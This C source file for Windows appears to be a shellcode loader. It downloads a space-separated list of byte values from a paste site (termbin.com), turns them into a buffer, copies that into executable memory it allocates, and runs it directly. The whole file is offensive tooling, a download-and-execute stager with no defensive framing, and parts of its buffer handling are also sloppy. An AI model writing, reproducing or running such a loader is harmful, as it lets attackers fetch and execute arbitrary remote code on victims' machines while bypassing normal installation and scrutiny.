#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <tchar.h>

#define HOST L"termbin.com"
#define PATH L"/d30q"

int main() {
    DWORD dw_size = 0;
    DWORD dw_downloaded = 0;
    LPSTR out_buffer;
    BOOL  result = FALSE;
    HINTERNET  h_sess = NULL, 
               h_conn = NULL,
               h_req = NULL;

    // Use WinHttpOpen to obtain a session handle.
    h_sess = WinHttpOpen( L"WinHTTP Example/1.0",  
                            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                            WINHTTP_NO_PROXY_NAME, 
                            WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (h_sess)
        h_conn = WinHttpConnect( h_sess, HOST,
                                   INTERNET_DEFAULT_HTTPS_PORT, 0);

    // Create an HTTP request handle.
    if (h_conn)
        h_req = WinHttpOpenRequest( h_conn, L"GET", PATH,
                                       NULL, WINHTTP_NO_REFERER, 
                                       WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                       WINHTTP_FLAG_SECURE);

    // Send a request.
    if (h_req)
        result = WinHttpSendRequest( h_req,
                                       WINHTTP_NO_ADDITIONAL_HEADERS,
                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
                                       0, 0);

 
    // End the request.
    if (result)
        result = WinHttpReceiveResponse( h_req, NULL);

    size_t buf_size = 0;
    unsigned char *tmp_buf = NULL;

    // Keep checking for data until there is nothing left.
    if (result) {
        // Check for available data.
        dw_size = 0;
        if (!WinHttpQueryDataAvailable( h_req, &dw_size)) 
            return 1;

        // Allocate space for the buffer.
        out_buffer = malloc(dw_size+1);

        if (!out_buffer)
            return 1;

        // Set the buffer to NULL.
        ZeroMemory(out_buffer, dw_size+1);

        // Try to read the data.
        if (!WinHttpReadData( h_req, (LPVOID)out_buffer, 
                                dw_size, &dw_downloaded))
            return 1;
        else {
            // Copy the downloaded data into our buffer
            tmp_buf = malloc(dw_size * sizeof(unsigned char));
            memcpy(tmp_buf, out_buffer, dw_size);

            // Count the number of integers in the buffer
            char *tok = strtok(out_buffer, " ");
            while (tok != NULL) {
                buf_size++;
                tok = strtok(NULL, " ");
            }

            // free memory
            if (out_buffer) {
                free(out_buffer);
            }
        }
    }

    // Allocate memory for our shellcode
    unsigned char *shell_buf = malloc(buf_size);

    // Copy the integers from the buffer into our shellcode
    char *tok = strtok(tmp_buf, " ");
    int i = 0;
    while (tok != NULL) {
        shell_buf[i] = (unsigned char)strtol(tok, NULL, 10);
        tok = strtok(NULL, " ");
        i++;
    }

    // Report any errors.
    if (!result)
        return 1;

    // Close any open handles.
    if (h_req) WinHttpCloseHandle(h_req);
    if (h_conn) WinHttpCloseHandle(h_conn);
    if (h_sess) WinHttpCloseHandle(h_sess);

    // Allocate memory for our shellcode using VirtualAlloc
    LPVOID lpvShellcode = VirtualAlloc( NULL, buf_size, 
                                        MEM_COMMIT, 
                                        PAGE_EXECUTE_READWRITE);

    // Copy our shellcode into the newly allocated memory using memcpy or WriteProcessMemory
    WriteProcessMemory( GetCurrentProcess(), 
                        lpvShellcode, shell_buf, 
                        buf_size, NULL);

    // Execute our shellcode using our newly allocated memory as a function
    ((void (*)())lpvShellcode)();

    return 0;
}
